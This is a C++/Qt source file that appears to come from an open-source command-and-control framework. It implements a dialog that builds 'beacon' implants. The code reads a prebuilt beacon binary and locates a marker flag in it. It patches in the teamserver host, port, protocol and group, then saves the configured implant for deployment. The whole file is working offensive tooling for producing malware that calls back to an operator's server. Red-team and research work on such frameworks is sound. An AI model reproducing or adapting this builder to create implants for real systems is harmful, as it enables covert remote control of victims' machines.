/*
 * Copyright (c) 2021.  https://github.com/geemion
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "configure.h"
#include "netio.pb.h"
#include "beacon_config.h"

beacon_configure::beacon_configure(QWidget* parent)
{
	ui_.setupUi(this);

	connect(ui_.generateButton, SIGNAL(clicked()), this, SLOT(generate_beacon()));
}

void beacon_configure::refresh_listener_combo(const ct::ServerInfo& listener)
{
	int size = listener.server_size();
	for (auto i = 0; i < size; i++)
	{
		auto listener_item = listener.server(i);
		QString listener_str = QString::fromStdString(listener_item.addr());
		ui_.ListenercomboBox->insertItem(ui_.ListenercomboBox->count(), listener_str);
	}
}

bool beacon_configure::get_beacon_connect_param(int& netio_type, std::string& teamserver, int& teamserver_port)
{
	static const QMap<QString, int> protocol_map{
		{ "tcp", c2::CONNNAME_TCP },
		{ "udp", c2::CONNNAME_UDP },
		{ "https", c2::CONNNAME_HTTPS },
	};

	QString addr = ui_.ListenercomboBox->currentText();
	QUrl url(addr);
	QString protocol = url.scheme().toLower();
	teamserver = url.host().toStdString();
	teamserver_port = url.port();

	if (protocol.isEmpty() ||
		teamserver.empty() ||
		!teamserver_port)
	{
		QMessageBox::warning(this, "error", "Listener addr is error");
		return false;
	}

	auto find = protocol_map.find(protocol);
	if (find == protocol_map.end())
	{
		QMessageBox::warning(this, "error", "Protocol addr don't support");
		return false;
	}

	netio_type = protocol_map[protocol];

	return true;
}

char* beacon_configure::get_flag(const void* beacon_buf, int beacon_size, const void* flag, int flag_size)
{
	if ((nullptr == beacon_buf) || (nullptr == flag)
		|| (beacon_size <= 0) || (flag_size <= 0))
		return nullptr;

	char*temp = (char*)beacon_buf;
	char*src_end = (char*)beacon_buf + beacon_size;
	char*find_end = (char*)flag + flag_size;
	char*s_src = nullptr, *s_find = nullptr;
	while (temp < src_end)
	{
		s_src = temp;
		s_find = (char*)flag;
		while (s_src < src_end && s_find < find_end && *s_src == *s_find)
			++s_src, ++s_find;
		if (s_find == find_end)
			return temp;
		++temp;
	}
	return nullptr;
}

void beacon_configure::generate_beacon()
{
	QString arch = ui_.beaconcomboBox->currentText();

	int netio_type = 0, teamserver_port = -1;
	std::string teamserver;
	if (!get_beacon_connect_param(netio_type, teamserver, teamserver_port))
		return;

	QString bit = ".x86";
	if (ui_.x64radioButton->isChecked())
		bit = ".x64";

	QString beacon_path = ":beacon/" + arch + "/beacon" + bit;

	QFile qfile(beacon_path);
	if (!qfile.open(QFile::ReadOnly))
	{
		QMessageBox::warning(this, "error", "qrc file no beacon:" + beacon_path);
		return;
	}

	QByteArray file_data = qfile.readAll();
	qfile.close();
	int flag = CONFIG_FLAG;
	CONNECT_INFO* connect_info = reinterpret_cast<CONNECT_INFO*>(get_flag(file_data.data(), file_data.size(), &flag, sizeof(flag)));
	if (!connect_info)
	{
		QMessageBox::warning(this, "error", "beacon file error beacon:" + beacon_path);
		return;
	}

	//todo:encrypt configure data
	connect_info->flag = QRandomGenerator::global()->generate();
	connect_info->teamserver_port = teamserver_port;
	connect_info->netio_type = netio_type;

	auto group = ui_.grouplineEdit->text().toStdString();
	strncpy(connect_info->group, group.c_str(), sizeof(connect_info->group));
	strncpy(connect_info->teamserver, teamserver.c_str(), sizeof(connect_info->teamserver));

	QString save_path = QFileDialog::getSaveFileName(this, tr("Save Beacon"), "", "");
	if (save_path.isEmpty())
		return;

	QFile wfile(save_path);
	if (wfile.open(QIODevice::WriteOnly)) {
		wfile.write(file_data.data(), file_data.size());
		wfile.close();

		QFileInfo file_info(save_path);
		QUrl url = QUrl::fromLocalFile(file_info.absolutePath());
		QDesktopServices::openUrl(url);
	}
	else {
		QMessageBox::warning(this, "error", "Beacon save failed at:" + save_path);
	}

}

